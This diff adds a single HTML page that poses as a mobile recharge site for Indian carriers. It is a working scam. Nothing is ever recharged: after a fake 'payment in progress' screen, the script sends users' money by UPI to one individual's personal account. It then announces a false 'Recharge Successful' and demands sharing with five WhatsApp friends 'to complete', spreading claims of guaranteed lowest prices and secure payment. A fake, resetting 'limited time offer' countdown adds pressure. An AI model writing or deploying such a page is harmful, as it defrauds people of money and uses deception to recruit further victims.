@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mobile Recharge App</title>
+  <style>
+    /* --- CSS Variables for Theming --- */
+    :root {
+      --primary-color: #6a11cb;
+      --primary-color-dark: #4b0f9c;
+      --gradient-start: #6a11cb;
+      --gradient-end: #2575fc;
+      --bg-color: #f0f2f5;
+      --container-bg: #ffffff;
+      --text-color: #333;
+      --text-color-light: #666;
+      --border-color: #ccc;
+      --history-bg: #f5f5f5;
+      --history-hover-bg: #e9e9e9;
+      --success-color: #2e7d32;
+      --error-color: #ef5350;
+      --whatsapp-color: #25D366;
+      --offer-bg: #fffde7;
+      --offer-text: #f57f17;
+      --offer-border: #fbc02d;
+    }
+
+    body.dark-mode {
+      --primary-color: #8e44ad;
+      --primary-color-dark: #732d91;
+      --gradient-start: #232526;
+      --gradient-end: #414345;
+      --bg-color: #121212;
+      --container-bg: #1e1e1e;
+      --text-color: #e0e0e0;
+      --text-color-light: #aaa;
+      --border-color: #444;
+      --history-bg: #2c2c2c;
+      --history-hover-bg: #3a3a3a;
+      --offer-bg: #3c3a2a;
+      --offer-text: #fdd835;
+      --offer-border: #f57f17;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, var(--gradient-start), var(--gradient-end));
+      color: var(--text-color);
+      transition: background 0.5s ease;
+    }
+
+    .container {
+      max-width: 440px; margin: 30px auto; background: var(--container-bg); border-radius: 16px;
+      padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); position: relative;
+      animation: slide-up 0.6s ease-out; transition: background 0.3s ease;
+    }
+
+    @keyframes slide-up { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+    .app-logo { text-align: center; margin-bottom: 10px; }
+    .app-logo svg { width: 50px; height: 50px; fill: var(--primary-color); }
+
+    h2 { text-align: center; color: var(--primary-color); margin-bottom: 10px; font-size: 2em; }
+    #clock { text-align: center; font-size: 14px; color: var(--text-color-light); margin-bottom: 20px; }
+
+    /* --- Offer Banner --- */
+    .offer-banner {
+        background: var(--offer-bg);
+        border: 1px solid var(--offer-border);
+        color: var(--offer-text);
+        padding: 12px;
+        margin: 15px 0;
+        border-radius: 10px;
+        text-align: center;
+        font-weight: 500;
+        animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(251, 192, 45, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(251, 192, 45, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(251, 192, 45, 0); }
+    }
+    .offer-banner.expired {
+        animation: none;
+        background: var(--history-bg);
+        border-color: var(--border-color);
+        color: var(--text-color-light);
+    }
+    #countdownTimer { font-weight: bold; margin-left: 5px; }
+
+
+    .theme-switch-wrapper { display: flex; align-items: center; position: absolute; top: 20px; right: 20px; }
+    .theme-switch { display: inline-block; height: 24px; position: relative; width: 48px; }
+    .theme-switch input { display:none; }
+    .slider { background-color: #ccc; bottom: 0; cursor: pointer; left: 0; position: absolute; right: 0; top: 0; transition: .4s; border-radius: 34px; }
+    .slider:before { background-color: #fff; bottom: 4px; content: ""; height: 16px; left: 4px; position: absolute; transition: .4s; width: 16px; border-radius: 50%; }
+    input:checked + .slider { background-color: var(--primary-color); }
+    input:checked + .slider:before { transform: translateX(24px); }
+
+    .network-options {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+    .network-options input {
+      display: none;
+    }
+    .network-options label {
+      flex: 1;
+      margin: 0 5px;
+      padding: 12px;
+      border: 2px solid var(--primary-color);
+      color: var(--primary-color);
+      text-align: center;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-weight: 500;
+    }
+    .network-options input:checked + label {
+      background: var(--primary-color);
+      color: white;
+    }
+
+    input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid var(--border-color); background-color: var(--bg-color); color: var(--text-color); font-size: 15px; transition: border-color 0.3s, background-color 0.3s; }
+    input:focus, select:focus { outline: none; border-color: var(--primary-color); }
+
+    button { width: 100%; padding: 14px; background: var(--primary-color); color: white; font-size: 16px; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; transition: background 0.3s; position: relative; }
+    button:hover:not(:disabled) { background: var(--primary-color-dark); }
+    button:disabled { background: #999; cursor: not-allowed; }
+
+    .recharge-btn-spinner { display: none; border: 2px solid #f3f3f3; border-top: 2px solid var(--primary-color-dark); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: -10px auto; }
+
+    .history { margin-top: 30px; }
+    #history-filter { margin-bottom: 15px; }
+    .history-entry { background: var(--history-bg); padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; border-left: 4px solid var(--primary-color); transition: background 0.3s ease, transform 0.2s ease; }
+    .history-entry:hover { transform: translateX(5px); background: var(--history-hover-bg); }
+
+    .toast { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: var(--primary-color); color: #fff; padding: 12px 20px; border-radius: 6px; opacity: 0; transition: all 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55); z-index: 4000; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+    .toast.show { opacity: 1; bottom: 20px; }
+
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1999; }
+    .modal-overlay.active { display: block; }
+
+    .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.9); opacity: 0; width: 90%; max-width: 380px; background: var(--container-bg); padding: 25px; border-radius: 14px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 2000; transition: opacity 0.3s ease, transform 0.3s ease; }
+    .modal.active { display: block; opacity: 1; transform: translate(-50%, -50%) scale(1); }
+    .modal h3 { text-align: center; color: var(--text-color); margin-top: 0; margin-bottom: 20px; font-size: 1.5em; }
+    .modal .close-btn { position: absolute; top: 10px; right: 15px; font-size: 28px; color: var(--text-color-light); cursor: pointer; border: none; background: none; }
+    .modal button { margin-top: 20px; background: var(--primary-color); }
+    .modal button:hover { background: var(--primary-color-dark); }
+
+    .copy-btn { margin-top: -10px; margin-bottom: 15px; background: #eee; color: var(--text-color); background-color: var(--history-bg); font-size: 13px; font-weight: normal; }
+    .clear-history { background: var(--error-color); margin-top: 10px; }
+    .clear-history:hover { background: #c62828; }
+    
+    .comment-box { text-align: center; margin-top: 25px; padding: 15px; background: rgba(255, 255, 255, 0.1); border-radius: 10px; font-style: italic; color: var(--text-color-light); min-height: 50px; display: flex; align-items: center; justify-content: center; transition: opacity 0.5s ease; }
+
+    /* --- Fullscreen Loader and Share Styles --- */
+    .fullscreen-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--container-bg); z-index: 3000; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+    .fullscreen-overlay.active { display: flex; }
+    .payment-loader { width: 60px; height: 60px; border: 5px solid #e0e0e0; border-top-color: var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .fullscreen-overlay h3 { color: var(--primary-color); font-size: 1.2em; margin-bottom: 15px; }
+    .fullscreen-overlay p { color: var(--text-color-light); margin-bottom: 8px; font-size: 1em; }
+    #share-overlay h2 { color: var(--success-color); font-size: 1.8em; margin-bottom: 15px; }
+    #share-overlay button { background-color: var(--whatsapp-color); width: auto; padding: 15px 30px; margin-top: 20px; }
+    #share-overlay button:hover { background-color: #128C7E; }
+
+  </style>
+</head>
+<body>
+
+  <div class="container" id="mainContainer">
+    <div class="theme-switch-wrapper">
+        <label class="theme-switch" for="checkbox">
+            <input type="checkbox" id="checkbox" />
+            <div class="slider round"></div>
+        </label>
+    </div>
+
+    <div class="app-logo">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M16.5,5.5V4A2,2,0,0,0,14.5,2h-5A2,2,0,0,0,7.5,4v1.5a4.5,4.5,0,0,0,0,9V16a2,2,0,0,0,2,2h5a2,2,0,0,0,2-2V14.5a4.5,4.5,0,0,0,0-9ZM9.5,4h5V5.5h-5Zm5,14h-5V16h5ZM12,13a2.5,2.5,0,1,1,2.5-2.5A2.5,2.5,0,0,1,12,13Z" /><path d="M7.5,22H16a1,1,0,0,0,0-2H8A1,1,0,0,0,7.5,22Z"/></svg>
+    </div>
+    <h2>Mobile Recharge</h2>
+    <div id="clock">--:--:--</div>
+
+    <div class="offer-banner" id="offerBanner">
+        <span>⚡️ Limited Time Offer ends in:</span>
+        <span id="countdownTimer">30:00</span>
+    </div>
+
+    <form id="rechargeForm">
+      <div class="network-options">
+        <input type="radio" id="jio" name="network" value="Jio" checked> 
+        <label for="jio">Jio</label>
+        
+        <input type="radio" id="airtel" name="network" value="Airtel"> 
+        <label for="airtel">Airtel</label>
+        
+        <input type="radio" id="vi" name="network" value="VI"> 
+        <label for="vi">Vi</label>
+
+        <input type="radio" id="bsnl" name="network" value="BSNL"> 
+        <label for="bsnl">BSNL</label>
+      </div>
+      <input type="tel" id="mobileNumber" placeholder="+91 xxxxx xxxxx" required>
+      <button type="button" class="copy-btn" onclick="copyNumber()">📋 Copy Number</button>
+      <select id="planSelect"> <option value="">-- Select Plan --</option> </select>
+      <input type="number" id="amount" placeholder="Enter Amount (₹)" required>
+      <button type="submit" id="rechargeBtn">
+        <span class="btn-text">Recharge</span>
+        <div class="recharge-btn-spinner"></div>
+      </button>
+    </form>
+
+    <div class="history" id="historyContainer">
+      <h3>Recharge History</h3>
+      <input type="text" id="historyFilter" placeholder="🔍 Search History by Number...">
+      <div id="historyList"></div>
+    </div>
+    <button class="clear-history" onclick="clearHistory()">🗑️ Clear History</button>
+    <div class="comment-box" id="commentBox"> Loading a tip for you... </div>
+  </div>
+
+  <!-- Payment Modal -->
+  <div class="modal-overlay" id="modalOverlay"></div>
+  <div class="modal" id="paymentModal">
+    <button class="close-btn" onclick="closeModal()">&times;</button>
+    <h3>Send payment</h3>
+    <p><strong>Number:</strong> <span id="payNumber"></span></p>
+    <p><strong>Operator:</strong> <span id="payOperator"></span></p>
+    <p><strong>Amount:</strong> ₹<span id="payAmount"></span></p>
+    <p><strong>Date:</strong> <span id="payDate"></span></p>
+    <button onclick="confirmPayment()">Payment Now</button>
+  </div>
+
+  <!-- Fullscreen Payment Loader -->
+  <div class="fullscreen-overlay" id="payment-loader-overlay">
+      <div class="payment-loader"></div>
+      <h3>Payment in progress...</h3>
+      <p>Please wait while we process your payment</p>
+      <p>Please do not close this page</p>
+      <p>Your payment is being processed securely</p>
+  </div>
+
+  <!-- Fullscreen Share Screen -->
+  <div class="fullscreen-overlay" id="share-overlay">
+      <h2>🎉 Recharge Successful! 🎉</h2>
+      <p>Final step: Share with 5 friends on WhatsApp to complete.</p>
+      <button onclick="shareOnWhatsApp()">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16" style="margin-right: 8px; vertical-align: middle;"><path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"/></svg>
+        Share on WhatsApp
+      </button>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        let currentRechargeEntry = null;
+        let countdownInterval;
+
+        const form = document.getElementById("rechargeForm"), mobileInput = document.getElementById("mobileNumber"), toast = document.getElementById("toast"), planSelect = document.getElementById("planSelect"), amountInput = document.getElementById("amount"), historyList = document.getElementById("historyList"), historyFilter = document.getElementById("historyFilter"), rechargeBtn = document.getElementById('rechargeBtn'), btnText = rechargeBtn.querySelector('.btn-text'), spinner = rechargeBtn.querySelector('.recharge-btn-spinner'), paymentModal = document.getElementById("paymentModal"), modalOverlay = document.getElementById("modalOverlay"), payNumber = document.getElementById("payNumber"), payOperator = document.getElementById("payOperator"), payAmount = document.getElementById("payAmount"), payDate = document.getElementById("payDate"), themeToggle = document.getElementById("checkbox"), commentBox = document.getElementById("commentBox"), paymentLoaderOverlay = document.getElementById("payment-loader-overlay"), shareOverlay = document.getElementById("share-overlay"), offerBanner = document.getElementById("offerBanner"), countdownTimerEl = document.getElementById("countdownTimer");
+
+        const plans = { 
+            Jio: [ { label: "₹149 – 28 Days, 1.5GB/Day", amount: 149 }, { label: "₹249 – 48 Days, 2GB/Day", amount: 249 }, { label: "₹499 – 98 Days, 2.5GB/Day", amount: 499 }, { label: "₹999 – 200 Days, 2.5GB/Day", amount: 999 }, { label: "₹1499 – 365 Days, 3GB/Day", amount: 1499 } ], 
+            Airtel: [ { label: "₹159 – 28 Days, 1.5GB/Day", amount: 159 }, { label: "₹279 – 48 Days, 2GB/Day", amount: 279 }, { label: "₹499 – 98 Days, 2.5GB/Day", amount: 499 }, { label: "₹1009 – 200 Days, 2.5GB/Day", amount: 1009 }, { label: "₹1599 – 365 Days, 3GB/Day", amount: 1599 } ], 
+            VI: [ { label: "₹269 – 28 Days, 1GB/Day", amount: 269 }, { label: "₹479 – 56 Days, 1.5GB/Day", amount: 479 }, { label: "₹719 – 84 Days, 1.5GB/Day", amount: 719 }, { label: "₹839 – 84 Days, 2GB/Day + Rollover", amount: 839 } ], 
+            BSNL: [ { label: "₹187 – 28 Days, 2GB/Day", amount: 187 }, { label: "₹397 – 200 Days, 2GB/Day", amount: 397 }, { label: "₹429 – 81 Days, 1GB/Day", amount: 429 }, { label: "₹666 – 110 Days, 2GB/Day", amount: 666 } ] 
+        };
+        const randomComments = ["Tip: Recharge on time to avoid service disruption.", "Did you know? Some plans offer data rollover!", "Fact: The first mobile call was made in 1973.", "Remember to check for cashback offers before recharging.", "Tip: Use Wi-Fi whenever possible to save mobile data."];
+
+        const startCountdown = () => {
+            let offerEndTime = localStorage.getItem('offerEndTime');
+            if (!offerEndTime || offerEndTime < Date.now()) {
+                offerEndTime = Date.now() + 30 * 60 * 1000;
+                localStorage.setItem('offerEndTime', offerEndTime);
+            }
+            countdownInterval = setInterval(() => {
+                const now = Date.now();
+                const distance = offerEndTime - now;
+                if (distance < 0) {
+                    clearInterval(countdownInterval);
+                    offerBanner.innerHTML = "😢 Offer Expired!";
+                    offerBanner.classList.add("expired");
+                    return;
+                }
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                countdownTimerEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        };
+
+        const updatePlans = () => { const op = document.querySelector('input[name="network"]:checked').value; planSelect.innerHTML = `<option value="">-- Select Plan --</option>`; plans[op].forEach(p => { const opt = document.createElement("option"); opt.value = p.amount; opt.textContent = p.label; planSelect.appendChild(opt); }); };
+        const showToast = (msg) => { toast.textContent = msg; toast.classList.add("show"); setTimeout(() => toast.classList.remove("show"), 3000); };
+        window.showToast = showToast; 
+        const loadClock = () => { setInterval(() => { document.getElementById("clock").textContent = new Date().toLocaleTimeString('en-US'); }, 1000); };
+        const loadHistory = (filter = '') => { const h=JSON.parse(localStorage.getItem("rechargeHistory"))||[];historyList.innerHTML="";const fH=h.filter(e=>e.number.includes(filter));if(fH.length===0){historyList.innerHTML=`<p style="text-align:center;color:var(--text-color-light);">No history found.</p>`;}else{fH.reverse().forEach(e=>{const d=document.createElement("div");d.className="history-entry";d.innerHTML=`📱 <strong>${e.number}</strong>|₹${e.amount}|${e.operator}<br><small>${e.date}</small>`;historyList.appendChild(d);});}};
+        window.clearHistory = () => { if (confirm("Are you sure?")) { localStorage.removeItem("rechargeHistory"); loadHistory(); showToast("🗑️ History cleared!"); } };
+        window.copyNumber = () => { if(!mobileInput.value) { showToast("❌ Number field is empty!"); return; } navigator.clipboard.writeText(mobileInput.value); showToast("📋 Copied to clipboard!"); };
+        const showPaymentModal = (entry) => { currentRechargeEntry = entry; payNumber.textContent = entry.number; payOperator.textContent = entry.operator; payAmount.textContent = entry.amount; payDate.textContent = entry.date; modalOverlay.classList.add("active"); paymentModal.classList.add("active"); };
+        window.closeModal = () => { modalOverlay.classList.remove("active"); paymentModal.classList.remove("active"); };
+        window.confirmPayment = () => {
+            if (!currentRechargeEntry) return;
+            closeModal();
+            paymentLoaderOverlay.classList.add('active');
+            setTimeout(() => {
+                paymentLoaderOverlay.classList.remove('active');
+                const amount = currentRechargeEntry.amount;
+                const upiUrl = `upi://pay?pa=rahilblue@fam&pn=Mir Rahil&am=${amount}.00`;
+                window.location.href = upiUrl;
+                shareOverlay.classList.add('active');
+            }, 5000);
+        };
+        
+        window.shareOnWhatsApp = () => {
+            const websiteLink = window.location.href;
+            const shareText = `🔋 Cheapest Mobile Recharge Website 🔋
+
+Looking for the cheapest mobile recharge website?
+Compare prices, 💰 cashback offers, and ⚡ instant recharge services all in one place!
+
+Our platform helps you find the best prepaid and postpaid recharge deals from top providers like 📱 Jio, 📶 Airtel, 📡 Vi, and 🛰️ BSNL.
+
+✨ What We Offer:
+✅ Instant recharge 🔁
+✅ Lowest prices guaranteed 💸
+✅ Secure payment options 🔐
+
+🔗 Visit now and start saving on every recharge! 🚀
+${websiteLink}`;
+            const msg = encodeURIComponent(shareText);
+            window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
+            shareOverlay.classList.remove('active');
+            showToast("✅ Thank you for sharing!");
+        };
+
+        const setButtonLoading = (isLoading) => { rechargeBtn.disabled = isLoading; btnText.style.display = isLoading ? 'none' : 'block'; spinner.style.display = isLoading ? 'block' : 'none'; };
+        const updateRandomComment = () => { const idx = Math.floor(Math.random() * randomComments.length); commentBox.style.opacity = 0; setTimeout(() => { commentBox.textContent = randomComments[idx]; commentBox.style.opacity = 1; }, 500); };
+
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const number = mobileInput.value.trim(), operator = document.querySelector('input[name="network"]:checked').value, amount = amountInput.value;
+            if (!/^(\+91)?[6-9]\d{9}$/.test(number)) { showToast("❌ Invalid Indian mobile number."); return; }
+            if (!amount || amount <= 0) { showToast("❌ Please enter a valid amount."); return; }
+            setButtonLoading(true);
+            setTimeout(() => {
+                const entry = { number: number.startsWith("+91") ? number : "+91 " + number, operator, amount, date: new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }) };
+                const history = JSON.parse(localStorage.getItem("rechargeHistory")) || [];
+                history.push(entry); localStorage.setItem("rechargeHistory", JSON.stringify(history));
+                loadHistory(); showPaymentModal(entry); form.reset(); updatePlans(); setButtonLoading(false);
+            }, 1000);
+        });
+        document.querySelectorAll('input[name="network"]').forEach(i => { i.addEventListener("change", updatePlans); });
+        planSelect.addEventListener("change", () => { if (planSelect.value) { amountInput.value = planSelect.value; } });
+        historyFilter.addEventListener('input', (e) => { loadHistory(e.target.value); });
+        themeToggle.addEventListener('change', () => { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); });
+        if (localStorage.getItem('theme') === 'dark') { document.body.classList.add('dark-mode'); themeToggle.checked = true; }
+        modalOverlay.addEventListener('click', closeModal);
+
+        // --- Initializations ---
+        updatePlans(); loadClock(); loadHistory(); updateRandomComment(); startCountdown(); setInterval(updateRandomComment, 7000);
+    });
+  </script>
+</body>
+</html>
